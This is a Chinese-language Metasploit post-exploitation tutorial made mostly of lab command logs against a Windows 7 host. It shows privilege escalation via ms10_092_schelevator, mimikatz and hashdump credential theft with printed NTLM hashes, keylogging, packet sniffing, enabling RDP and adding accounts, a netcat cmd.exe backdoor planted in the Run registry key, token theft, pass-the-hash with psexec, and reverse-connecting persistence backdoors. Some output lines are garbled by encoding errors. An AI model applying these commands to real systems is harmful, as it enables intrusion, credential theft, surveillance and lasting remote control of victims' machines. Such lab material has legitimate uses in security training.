msf exploit(multi/handler) > use exploit/windows/local/ms10_092_schelevator 
msf exploit(windows/local/ms10_092_schelevator) > set session 5
session => 5
msf exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 192.168.22.170:4444 
[*] Preparing payload at C:\Users\Win7\AppData\Local\Temp\IsamdcUIQQzv.exe
[*] Creating task: lk6j4xdPvbMB
[*] �ɹ�: �ɹ������ƻ����� "lk6j4xdPvbMB"��
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\lk6j4xdPvbMB...
[*] Original CRC32: 0xd75a78d9
[*] Final CRC32: 0xd75a78d9
[*] Writing our modified content back...
[*] Validating task: lk6j4xdPvbMB
[*] ����: �޷���������Դ��
[*] Disabling the task...
[*] �ɹ�: �����˼ƻ����� "lk6j4xdPvbMB" �Ĳ�����
[*] SCHELEVATOR
[*] Enabling the task...
[*] �ɹ�: �����˼ƻ����� "lk6j4xdPvbMB" �Ĳ�����
[*] SCHELEVATOR
[*] Executing the task...
[*] �ɹ�: �������� "lk6j4xdPvbMB"��
[*] SCHELEVATOR
[*] Deleting the task...
[*] Sending stage (179779 bytes) to 192.168.22.171
[*] �ɹ�: �ƻ������� "lk6j4xdPvbMB" ���ɹ�ɾ����
[*] SCHELEVATOR
[*] Meterpreter session 6 opened (192.168.22.170:4444 -> 192.168.22.171:50044) at 2018-12-18 23:00:31 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

mimikatz抓取密码
load mimikatz    #help mimikatz 查看帮助
wdigest  #获取Wdigest密码
mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
mimikatz_command -f sekurlsa::searchPasswords
meterpreter > load mimikatz 
Loading extension mimikatz...[!] Loaded x86 Mimikatz on an x64 architecture.

[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7600).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > wdigest
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID     Package    Domain        User           Password
------     -------    ------        ----           --------
0;4181124  NTLM       WIN-7         Administrator  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)
0;362944   NTLM       WIN-7         Win7           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)
0;362915   NTLM       WIN-7         Win7           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)
0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)
0;996      Negotiate  UKNOWSEC      WIN-7$         mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)
0;47330    NTLM                                    mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)
0;999      Negotiate  UKNOWSEC      WIN-7$         mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)

meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : win-7.uknowsec.cn
BootKey    : 3a0c900d7f8d17e229f42745cc605dfe

Rid  : 500
User : Administrator
LM   : 
NTLM : 45a524862326cb9e7d85af4017a000f0

Rid  : 501
User : Guest
LM   : 
NTLM : 

Rid  : 1001
User : Win7
LM   : 
NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0

远程桌面&截屏
enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
set_desktop   #设置meterpreter关联的桌面  -h查看帮助
screenshot  #截屏
use espia  #或者使用espia模块截屏  然后输入screengrab
run vnc  #使用vnc远程桌面连接
开启rdp&添加用户
getgui命令
run getgui –h #查看帮助
run getgui -e #开启远程桌面
run getgui -u lltest2 -p 123456   #添加用户
run getgui -f 6661 –e   #3389端口转发到6661
getgui 系统不推荐，推荐使用run post/windows/manage/enable_rdp
getgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆
enable_rdp脚本
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662
脚本位于/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb
通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe通过net user添加；端口转发是利用的portfwd命令

键盘记录
keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop #结束键盘记录
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...


meterpreter > keyscan_stop
Stopping the keystroke sniffer...
sniffer抓包
use sniffer
sniffer_interfaces   #查看网卡
sniffer_start 2   #选择网卡 开始抓包
sniffer_stats 2   #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2   #停止抓包
meterpreter > use sniffer
Loading extension sniffer...Success.
meterpreter > sniffer_interfaces
- 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
- 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
- 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )

注册表操作
注册表基本命令
reg –h
    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称
    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据
注册表设置nc后门
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值

nc -v 192.168.159.144 443  #攻击者连接nc后门
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
[*] uploading  : /usr/share/windows-binaries/nc.exe -> C:\windows\system32
[*] uploaded   : /usr/share/windows-binaries/nc.exe -> C:\windows\system32\nc.exe
meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
Enumerating: HKLM\software\microsoft\windows\currentversion\run

  Values (1):

    VMware User Process

meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'
Successfully set lltest_nc of REG_SZ.
meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc
Key: HKLM\software\microsoft\windows\currentversion\Run
Name: lltest_nc
Type: REG_SZ
Data: C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe
meterpreter >
root@kali:~# nc 192.168.22.171 443
Microsoft Windows [�汾 6.1.7600]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\SysWOW64>whoami
whoami
win-7\win7

C:\Windows\SysWOW64>
令牌操纵
incognito假冒令牌
use incognito      #help incognito  查看帮助
list_tokens -u    #查看可用的token
impersonate_token 'NT AUTHORITY\SYSTEM'  #假冒SYSTEM token
或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\
execute -f cmd.exe -i –t    # -t 使用假冒的token 执行
或者直接shell
rev2self   #返回原始token
meterpreter > getuid
Server username: WIN-7\Administrator
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT AUTHORITY\SYSTEM
WIN-7\Administrator

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > rev2self 
meterpreter > getuid 
Server username: WIN-7\Administrator
steal_token窃取令牌
steal_token <pid值>   #从指定进程中窃取token   先ps
drop_token  #删除窃取的token
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > steal_token 3416
Stolen token with username: WIN-7\Administrator
meterpreter > getuid 
Server username: WIN-7\Administrator
meterpreter > drop_token 
Relinquished token, now running as: WIN-7\Administrator

哈希利用
获取哈希
run post/windows/gather/smart_hashdump  #从SAM导出密码哈希
#需要SYSTEM权限
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against WIN-7
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20181219014335_default_192.168.22.171_windows.hashes_427821.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY 3a0c900d7f8d17e229f42745cc605dfe...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[*]     No users with password hints on this system
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:45a524862326cb9e7d85af4017a000f0:::
meterpreter >
PSExec哈希传递
通过smart_hashdump获取用户哈希后，可以利用psexec模块进行哈希传递攻击
前提条件：

开启445端口 smb服务
开启admin$共享
msf > use exploit/windows/smb/psexec
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.159.134
msf > set LPORT 443
msf > set RHOST 192.168.159.144
msf >set SMBUser Administrator
msf >set SMBPass aad3b4*****04ee:5b5f00*****c424c
msf >set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain
msf >exploit
后门植入
metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。

persistence启动项后门
在C:\Users***\AppData\Local\Temp\目录下，上传一个vbs脚本
在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项

run persistence –h  #查看帮助
run persistence -X -i 5 -p 6661 -r 192.168.159.134
#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
meterpreter > run persistence -X -i 5 -p 6661 -r 192.168.22.170

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-7_20181219.5619/WIN-7_20181219.5619.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.22.170 LPORT=6661
[*] Persistent agent script is 99632 bytes long
[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\uIMYmofzh.vbs
[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\uIMYmofzh.vbs
[+] Agent executed with PID 336
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QXbddoBLcqYjXg
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QXbddoBLcqYjXg
msf > use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.22.170
lhost => 192.168.22.170
msf exploit(multi/handler) > set lport 6661
lport => 6661
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.22.170:6661 
[*] Sending stage (179779 bytes) to 192.168.22.171
[*] Meterpreter session 1 opened (192.168.22.170:6661 -> 192.168.22.171:49327) at 2018-12-19 01:57:52 -0500

meterpreter >
metsvc服务后门
在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter

run metsvc –h   # 查看帮助
run metsvc –A   #自动安装后门
meterpreter > run metsvc -A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\ADMINI~1\AppData\Local\Temp\QVRUVXrjfrcMn...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
     * Installing service metsvc
Cannot create service (0x00000431)

[*] Trying to connect to the Meterpreter service at 192.168.22.171:31337...
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
扫描脚本
扫描的脚本位于：
/usr/share/metasploit-framework/modules/auxiliary/scanner/
扫描的脚本较多，仅列几个代表：

use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/oracle/oracle_login
```
